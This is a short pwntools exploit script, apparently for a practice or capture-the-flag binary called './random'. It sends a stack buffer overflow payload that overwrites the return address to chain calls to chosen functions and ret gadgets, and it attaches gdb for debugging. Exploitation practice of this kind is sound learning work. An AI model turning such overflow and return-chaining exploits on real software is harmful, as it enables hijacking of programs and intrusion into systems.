from pwn import *

binary = ELF("./random")

context.binary = binary
# context.terminal = ['tmux', 'splitw', '-h']

print_random = binary.sym["print_random"]
read_option = binary.sym["read_option"]
print_same_number = 0x8048509
main = binary.sym['main']
ret_gadget = 0x08048373

seed = 0x1

offset = 9 + 4
payload = [
    b"1",
    b"A" * (offset - 1),
    pack(print_random),
    pack(print_same_number),
    pack(seed),
    pack(ret_gadget),
    pack(ret_gadget)


]

payload = b"".join(payload)

io = binary.process()

gdb.attach(io, '''catch syscall read''')

io.sendline(payload)

io.interactive()